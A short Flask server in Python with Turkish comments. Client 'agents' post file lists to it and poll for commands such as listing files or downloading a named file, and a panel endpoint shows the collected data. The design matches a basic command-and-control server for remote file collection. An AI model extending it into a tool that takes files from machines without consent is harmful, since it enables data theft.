from flask import Flask, request, jsonify

app = Flask(__name__)

# Geçici olarak verileri burada tutalım (Gerçekte veritabanı gerekir)
data_store = {
    "file_list": [],
    "command": "IDLE" # IDLE, LIST_FILES, DOWNLOAD:dosya_adi
}

@app.route('/agent', methods=['GET', 'POST'])
def agent_endpoint():
    if request.method == 'POST':
        # Client dosya listesini gönderiyor
        data_store["file_list"] = request.json.get("files", [])
        return jsonify({"status": "received", "next_command": data_store["command"]})
    
    # Client 'ne yapayım?' diye soruyor
    return jsonify({"command": data_store["command"]})

@app.route('/panel', methods=['GET'])
def panel_endpoint():
    return jsonify(data_store)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
